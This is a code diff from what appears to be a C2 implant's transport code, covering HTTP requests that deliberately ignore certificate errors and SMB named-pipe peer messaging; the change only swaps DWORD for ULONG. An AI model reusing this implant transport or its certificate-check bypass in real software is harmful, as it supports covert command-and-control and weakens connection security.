@@ -16,17 +16,17 @@ namespace Http {
         LPVOID Buffer       = { };
         LPVOID Download     = { };
 
-        DWORD Read          = 0;
-        DWORD Length        = 0;
-        DWORD Total         = 0;
-        DWORD Status        = 0;
-        DWORD nStatus       = sizeof(DWORD);
+        ULONG Read          = 0;
+        ULONG Length        = 0;
+        ULONG Total         = 0;
+        ULONG Status        = 0;
+        ULONG nStatus       = sizeof(ULONG);
 
         LPWSTR Header       = { };
         LPWSTR Endpoint     = { };
-        DWORD Flags         = 0;
-        DWORD nEndpoint     = 0;
-        DWORD nHeaders      = 0;
+        ULONG Flags         = 0;
+        ULONG nEndpoint     = 0;
+        ULONG nHeaders      = 0;
 
         Ctx->Transport.http->Method = L"GET";
 
@@ -58,7 +58,7 @@ namespace Http {
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-            if (!Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_SECURITY_FLAGS, &Flags, sizeof(DWORD))) {
+            if (!Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_SECURITY_FLAGS, &Flags, sizeof(ULONG))) {
                 return_defer(ntstatus);
             }
         }
@@ -228,7 +228,7 @@ namespace Smb {
 
         EXPLICIT_ACCESSA access = {};
         PACL acl = {};
-        DWORD result = 0;
+        ULONG result = 0;
 
         x_memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
         x_memset(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));
@@ -283,8 +283,8 @@ namespace Smb {
     BOOL PipeRead(PSTREAM Inbound, HANDLE Handle) {
         HEXANE
 
-        DWORD Read = 0;
-        DWORD Total = 0;
+        ULONG Read = 0;
+        ULONG Total = 0;
 
         do {
             if (!Ctx->win32.ReadFile(Handle, B_PTR(Inbound->Buffer) + Total, MIN((Inbound->Length - Total), PIPE_BUFFER_MAX), &Read, nullptr)) {
@@ -301,8 +301,8 @@ namespace Smb {
     BOOL PipeWrite(PSTREAM Outbound, HANDLE Handle) {
         HEXANE
 
-        DWORD Total = 0;
-        DWORD Write = 0;
+        ULONG Total = 0;
+        ULONG Write = 0;
 
         do {
             if (!Ctx->win32.WriteFile(Handle, B_PTR(Outbound->Buffer) + Total, MIN((Outbound->Length - Total), PIPE_BUFFER_MAX), &Write, nullptr)) {
@@ -321,9 +321,9 @@ namespace Smb {
         SMB_PIPE_SEC_ATTR SmbSecAttr = { };
         SECURITY_ATTRIBUTES SecAttr = { };
 
-        DWORD cbBytes = 0;
-        DWORD MsgSize = 0;
-        DWORD PeerId = 0;
+        ULONG cbBytes = 0;
+        ULONG MsgSize = 0;
+        ULONG PeerId = 0;
 
         if (!Handle) {
             SmbContextInit(&SmbSecAttr, &SecAttr);
